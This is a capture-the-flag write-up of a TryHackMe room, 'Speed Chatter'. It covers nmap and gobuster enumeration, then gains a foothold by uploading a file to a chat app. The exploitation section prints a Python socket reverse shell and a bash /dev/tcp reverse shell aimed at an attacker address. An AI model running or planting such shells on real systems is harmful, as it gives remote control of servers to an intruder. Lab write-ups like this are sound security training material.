A THM Room

By Sovren

Part of the Love at First Breach 2026 Event


My Dearest Hacker,

Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: `http://MACHINE_IP:5000`


# Reconnaissance 

I initially thought this room would be a vulnerable AI chatbot, but it looks like a page that is chatroom with the ability to upload a file (in this case, probably a reverse shell!)

The site appears to use php and python. 

My Wappalyzer does not work on the site for some reason.


# Enumeration

### Nmap

`sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.80.164.5 -p-`

`PORT     STATE SERVICE VERSION`
`22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   256 17:1f:41:2e:21:ce:7f:e1:8d:6c:85:4b:8c:fd:84:73 (ECDSA)`
`|_  256 2e:4c:32:20:6a:16:19:bd:95:ce:66:75:8a:24:1b:a4 (ED25519)`
`5000/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.10.12)`
`|_http-title: LoveConnect - Speed Chatter`
`Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.7 - 4.19 (92%)`
`No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).`
`TCP/IP fingerprint:`
`OS:SCAN(V=7.98%E=4%D=2/14%OT=22%CT=1%CU=31703%PV=Y%DS=3%DC=I%G=Y%TM=6990EA3`
`OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ`
`OS:(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%`
`OS:II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%IS`
`OS:R=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11`
`OS:NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B`
`OS:3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)`
`OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=`
`OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T`
`OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+`
`OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK`
`OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)`


### Gobuster

`gobuster dir -u http://10.80.164.5:5000 -w /usr/share/wordlists/dirb/common.txt`

Nothing returned at all, and given that these valentines themed rooms have been very straightforward, I am going to assume that the file upload is the key here and move onto the exploitation stage. 


# Exploitation

I already have a reverse php webshell on my system that has been configured to my VM. 

After uploading the php reverse shell and setting up a listener, the exploit does not appear to work. 

Then tried a python reverse shell instead. 

This one from pentestmonkey didn't work:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

But this one did:

`import os`
`os.system("bash -c 'bash -i >& /dev/tcp/<attacker.ip>/1234 0>&1'")`



# Reporting

Another fairly straightforward room as part of the event. It was obvious from the get go that this would be a reverse-shell challenge. 

### Successful Exploit

A Python script leveraging `os.system()` to invoke a `Bash /dev/tcp reverse shell` successfully executed, resulting in an interactive shell.

This confirmed:

- Arbitrary file upload without validation
- Uploaded files executed server-side
